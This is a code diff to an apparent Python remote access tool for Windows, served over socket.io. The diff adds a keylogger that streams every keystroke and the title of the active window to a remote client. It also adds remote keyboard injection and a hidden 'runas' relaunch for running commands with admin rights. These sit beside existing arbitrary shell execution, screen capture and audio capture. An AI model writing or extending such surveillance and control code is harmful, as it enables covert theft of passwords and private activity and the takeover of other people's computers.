@@ -12,18 +12,23 @@ import io
 import pyaudio
 import numpy as np
 import threading
-import win32gui, win32ui
+import win32gui
+import win32ui
 import sounddevice as sd
 import soundfile as sf
+import win32process
+import keyboard
 
 sio = socketio.AsyncServer(cors_allowed_origins='*')
 app = web.Application()
 sio.attach(app)
 
+HOST = '192.168.1.153'
 SOCKET_PORT = 4101
 
 working_dir = "."
 _capture_screen = bool(False)
+_start_keylog = bool(False)
 
 audio_on = False
 
@@ -37,7 +42,6 @@ DURATION = 1
 async def connect(sid, environ):
     global audio_on
     print('connect', sid)
-    # get_admin()
     await sio.emit('command_dir', os.path.abspath(working_dir))
     audio_on = False
 
@@ -45,6 +49,7 @@ async def connect(sid, environ):
 async def disconnect(sid):
     print('disconnect', sid)
     await stop_stream()
+    await stop_keylog()
     
 @sio.event
 async def start_stream(_, data):
@@ -147,6 +152,8 @@ async def command_input(_, cmd_in):
             os.chdir(working_dir)
             await sio.emit('command_dir', os.popen('cd').read().strip())
             await sio.emit('command_output', os.popen('cd').read().strip())
+        elif cmd.startswith('admin'):
+            await get_admin(cmd, working_dir)
         else:
             # Execute the command and get the output
             result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=working_dir)
@@ -162,7 +169,7 @@ async def command_input(_, cmd_in):
     # Run the command loop
     await command_loop(working_dir)
 
-def get_admin(*_):
+async def get_admin(cmd, working_dir):
     # Check if running with admin privileges
     def is_admin():
         try:
@@ -171,15 +178,17 @@ def get_admin(*_):
             return False
 
     # Relaunch the script with admin privileges if needed
-    def run_as_admin():
-        print(is_admin())
-        if not is_admin():
-            script = os.path.abspath(sys.argv[0])
-            params = ' '.join([str(arg) for arg in sys.argv[1:]])
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
+    async def run_as_admin(cmd, working_dir):
+        print('admin:', is_admin())
+        if is_admin():
+            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=working_dir)
+            await sio.emit('command_output', result.stdout)
+            await sio.emit('command_output_error', result.stderr)
+        else:
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
 
     # Run the script with admin permissions
-    run_as_admin()
+    await run_as_admin(cmd, working_dir)
     
 @sio.event
 async def create_file(_, data):
@@ -244,5 +253,90 @@ def get_cursor(hcursor):
     return im
 
 
+def get_active_window_title():
+    return win32gui.GetWindowText(win32gui.GetForegroundWindow())
+
+def get_active_window_pid():
+    return win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())[1]
+
+async def on_key_event(event):
+    # with open('0x29812exp.txt', 'a', encoding='utf-8') as f:
+    print(event.name, 'pressed')
+    if event.name == 'space':
+        await sio.emit('keylog_press_con', ' ')
+    elif event.name == 'enter':
+        await sio.emit('keylog_press', '↵')
+    elif event.name == 'backspace':
+        await sio.emit('keylog_press_con', '←')
+    else:
+        await sio.emit('keylog_press_con', event.name)
+
+def on_key_event_wrapper(event):
+    if _start_keylog:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(on_key_event(event))
+
+async def check_window_change():
+    global _start_keylog
+    
+    previous_window_pid = get_active_window_pid()
+    keyboard.on_press(on_key_event_wrapper)
+    
+    while _start_keylog:
+        current_window_pid = get_active_window_pid()
+
+        if current_window_pid != previous_window_pid:
+            previous_window_pid = current_window_pid
+            await sio.emit('keylog_screen_change', get_active_window_title())
+
+        await asyncio.sleep(0.2)
+
+@sio.event
+async def start_keylog(*_):
+    global _start_keylog
+    
+    print("start keylogging")
+    _start_keylog = True
+    keylog_thread = threading.Thread(target=asyncio.run, args=(check_window_change(),), daemon=True)
+    keylog_thread.start()
+
+@sio.event
+async def stop_keylog(*_):
+    global _start_keylog
+    
+    print("stop keylogging")
+    keyboard.unhook_all()
+    _start_keylog = False
+
+
+async def read_file(file_path):
+    if os.path.exists(file_path):
+        with open(file_path, 'r') as file:
+            await sio.emit("file_content", file.read())
+    else:
+        await sio.emit('file_read_not_found', True)
+
+
+async def edit_file(file_path, new_content):
+    if os.path.exists(file_path):
+        with open(file_path, 'w') as file:
+            file.write(new_content)
+    else:
+        await sio.emit('file_edit_not_found', True)
+
+@sio.event
+async def keypress_down(_, data):
+    key = data['key']
+    keyCode = data['code']
+    keyboard.press(key)
+    
+@sio.event
+async def keypress_up(_, data):
+    key = data['key']
+    keyCode = data['code']
+    keyboard.release(key)
+
+
 if __name__ == '__main__':
-    web.run_app(app=app, port=SOCKET_PORT)
+    web.run_app(app=app, port=SOCKET_PORT, host=HOST)
